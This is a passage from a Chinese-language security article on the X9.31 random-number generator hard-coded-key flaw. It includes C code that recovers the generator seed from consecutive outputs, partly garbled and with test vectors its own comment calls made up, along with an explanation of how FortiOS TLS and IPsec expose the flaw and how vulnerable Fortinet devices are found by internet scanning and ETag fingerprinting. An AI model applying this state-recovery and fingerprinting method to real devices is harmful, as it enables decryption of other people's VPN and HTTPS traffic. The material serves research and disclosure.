        const unsigned char seed[8];
        const unsigned char block1[8];
        const unsigned char block100[8];
    } PRNGtest;
    /* FIXME: these test vectors are made up! */
    static PRNGtest t1=
        {
        { { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07 },  //key
          { 0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f },
        },
        { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 },  //fake_time
        { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 },  //seed
        { 0x33,0xc3,0xdf,0xfe,0x60,0x60,0x49,0x9e },
        { 0xcd,0x2b,0x41,0xaf,0x80,0x51,0x37,0xd8 }
        };
    static PRNGtest t2=
        {
        { { 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff },
          { 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff } },
        { 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff },
        { 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff },
        { 0x65,0xf1,0xa4,0x07,0x42,0x38,0xd5,0x25 },
        { 0xbb,0x75,0x84,0x20,0x7a,0x44,0xf0,0xa0 }
        };
    static void dump(const unsigned char *b,int n)
    {
        while(n-- > 0)
        {
            printf(" %02x",*b++);
        }
    }
    static void compare(const unsigned char *result,const unsigned char *expected, int n)
    {
        int i;
        for(i=0 ; i keys[0],t->keys[1]);
        FIPS_test_mode(1,t->time);
        FIPS_rand_seed(t->seed,sizeof t->seed);
        if(FIPS_rand_bytes(buf,8) block1,8);
        for(n=0 ; n block100,8);
        FIPS_test_mode(0,NULL);
        //FIPS_rand_cleanup();
    }
    void gen_rand(const PRNGtest *t)
    {
       unsigned char buf[8];
        int n;
        FIPS_set_prng_key(t->keys[0],t->keys[1]);
        FIPS_rand_seed(t->seed,sizeof t->seed);
        for(n=0 ; n 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    static DES_cblock key1;
    static DES_cblock key2;
    static DES_key_schedule ks1,ks2;
    DES_cblock keys[2]=
    {
        { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07 }, 
        { 0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f }
    };
    void dump(const unsigned char *b,int n);
    void FIPS_set_prng_key(const unsigned char k1[8],const unsigned char k2[8]);
    void xor_vectors(unsigned char *in1, unsigned char *in2,
                unsigned char *out, unsigned int size);
    static void FIPS_rand_encrypt(unsigned char *out,const unsigned char *in);
    static void FIPS_rand_decrypt(unsigned char *out,const unsigned char *in);
    int compare_seed(unsigned char *rand1 ,unsigned char *time_buf1, unsigned char *rand2, unsigned char *time_buf2);
    void dump(const unsigned char *b,int n)
    {
        while(n-- > 0)
        {
            printf(" %02x",*b++);
        }
        putchar('n');
    }
    void FIPS_set_prng_key(const unsigned char k1[8],const unsigned char k2[8])
    {
        memcpy(&key1,k1,sizeof key1);
        memcpy(&key2,k2,sizeof key2);
        DES_set_key(&key1,&ks1);
        DES_set_key(&key2,&ks2);
    }
    void xor_vectors(unsigned char *in1, unsigned char *in2,
                unsigned char *out, unsigned int size)
    {
        int i;
        for (i = 0; i < size; i++)
            out[i] = in1[i] ^ in2[i];
    }
    static void FIPS_rand_encrypt(unsigned char *out,const unsigned char *in)
    {
        DES_ecb2_encrypt(in,out,&ks1,&ks2,1);
    }
    static void FIPS_rand_decrypt(unsigned char *out,const unsigned char *in)
    {
        DES_ecb2_encrypt(in,out,&ks1,&ks2,0);
    }
    int compare_seed(unsigned char *rand1 ,unsigned char *time_buf1, unsigned char *rand2, unsigned char *time_buf2)
    {
        unsigned char in1[8], out2[8];
        unsigned char seed1[8], seed2[8];
        unsigned char T1[8], T2[8];
        int i;
        /*
        Ti=Ek(time_buf_i)
        seed[i+1]=Ek(rand[i]^Ti)
        */
        FIPS_set_prng_key(keys[0],keys[1]);
        FIPS_rand_encrypt(T1,time_buf1);
        xor_vectors(rand1,T1,in1,8);
        FIPS_rand_encrypt(seed1,in1);
        dump(seed1,8);
        /*
        Ti+1=Ek(time_buf_i+1)
        seed[i+1]=Dk(rand[i+1])^Ti+1
        */
        FIPS_rand_encrypt(T2,time_buf2);
        FIPS_rand_decrypt(out2,rand2);
        xor_vectors(out2,T2,seed2,8);
        dump(seed2,8);
        if(memcmp(seed1,seed2,8)==0)
            return 1;
        return 0;
    }
    int main()
    {
        unsigned char rand1[]={0xfa,0x45,0x71,0xc0,0x54,0x86,0x43,0xd6};
        unsigned char time_buf1[]={0x0d,0x08,0x71,0x5c,0xe4,0x11,0x0c,0x00};
        unsigned char rand2[]={0xcd,0x5a,0xa2,0x0a,0x47,0x77,0x31,0x28};
        unsigned char time_buf2[]={0x0d,0x08,0x71,0x5c,0xef,0x11,0x0c,0x00};
        int ret=compare_seed(rand1,time_buf1,rand2,time_buf2);
        if(ret)
            printf("mached!n");
        else
            printf("mismached!n");
    }
利用测试输出的连续两组随机数及确定的时间，验证攻击算法的正确性。实验表明，验证算法正确。
## 四、存在随机数漏洞的产品攻击
X9.31随机数发生器的NIST设计描述没有规定如何生成或存储分组密码密钥。
但是，希望获得FIPS认证的供应商需要制作详细的公共“安全政策”文档，描述其加密实施和密钥管理程序。 论文对针对X9.31
PRG认证的产品的安全策略进行了系统研究，以了解有多少供应商公开记录了潜在的硬编码密钥漏洞。 作者从NIST网站获得了认证设备清单。统计结果如下：
不安全设备的文档表明AES密钥静态存储在固件或闪存中，并在运行时加载到PRG中。共有12家供应商，涉及40个产品线。其中包括Cisco、Fortinet等大厂商。
FortiOS
4.3的FIPS认证表明X9.31密钥是“在模块外部生成的”。作者对两个版本的FortiOS进行了逆向工程，发现他们使用相同的硬编码密钥进行X9.31实现，然后将其用作操作系统的随机数生成器。
FortiOSv4是Fortigate网络设备的嵌入式操作系统。两个镜像分别来自FortiGate
100D防火墙的固件和运行相同版本操作系统的“虚拟设备”（VM）FortiOS是一种GNU/Linux变种，具有定制的shell，其内核模块实现了硬件接口和加密功能。
内核是Linux
2.4.37。通过binwalk即可实现固件镜像解压，并对其操作系统加载。FortiOS通过导出Linux字符设备模块，在内核中实现X9.31随机数发生器。
在引导时，init进程加载模块并将/dev/urandom替换为与X9.31字符设备对应的文件系统节点。PRG实现使用对do_gettimeofday（）的调用生成时间戳，并生成包含64位时间到最接近的微秒的struct
timeval。
此结构将两次复制到缓冲区中，以形成X9.31生成器的完整128位时间戳。作者对提供X9.31实现的内核模块进行了逆向工程，并找到了用于PRG的硬编码AES密钥。
###  （一）HTTPS攻击
FortiOS v4使用OpenSSL实现TLS。 初始化库时，它将随机数生成方法设置为系统PRG，即X9.31实现。
TLS服务器hello random包含一个四字节时间戳，后跟两个X9.31 PRG输出的原始块，截断为28字节，允许状态恢复攻击。 但是，TLS
DH密钥交换实现方式为临时静态Diffie-Hellman，每次重启后生成直至关机，不容易对服务器直接密钥恢复攻击。
###  （二）IPSec攻击
IKE守护程序基于raccoon2项目侦察，使用GNU MP库编译。守护进程使用的所有随机数都是通过/dev/urandom生成，因此使用X9.31模块。
在IKEv1实现中，PRG输出的第一个分组用于生成IKEv1
cookie，方法是将其与IP地址，端口，内存地址以及时间一起散列，以秒为单位。在IKEv2实现中，SPI字段（相当于IKEv1
cookie）是PRG输出的八个原始字节。在IKEv1和IKEv2中，下一个PRG输出分组用于生成握手Random，其长度为16个字节。对于与1024位Oakley
Group 2 prime进行Diffie-Hellman密钥交换的情况，FortiOS
v4使用来自PRG的两个连续块生成指数。在虚拟设备的实现中，随机字节直接读入Diffie-Hellman指数而不进行修改。
## 四、Fortinet特定版本产品的在线探测
作者使用ZMap在在互联网空间内扫描TCP 443端口（HTTPS）和 UDP 500端口（IKE）。通过IKE协议中的Vendor
ID信息，即可确定VPN类型。HTTPS扫描中，一方面可通过证书common
name字段判断设备厂商信息。进一步可通过ETAG判断设备指纹信息。方程式组织泄露的文件中注明了ETAG及其对应版本的详细信息，可作为版本探测的参考。而在现实攻击中，还可通过telnet和SSH协议的flag信息判断Fortinet的产品。
Fortigate防火墙证书信息
方程式组织泄露文件EGBL.config
下面重点对ETAG的作用进阐述。
HTTP协议规格说明定义ETag为“被请求变量的实体值”。另一种说法是，ETag是一个可以与Web资源关联的记号（token）。典型的Web资源可以一个Web页，但也可能是JSON或XML文档。服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端，以下是服务器端返回的格式：`ETag:"50b1c1d4f775c61:df3"`。客户端的查询更新格式是这样的：`If-None-Match : W / "50b1c1d4f775c61:df3"`如果ETag没改变，则返回状态304然后不返回，这也和Last-Modified一样。测试Etag主要在断点下载时比较有用。利用ETAG，可以作为服务器版本的特定指纹信息。针对FortiGate防火墙扫描返回的信息如下。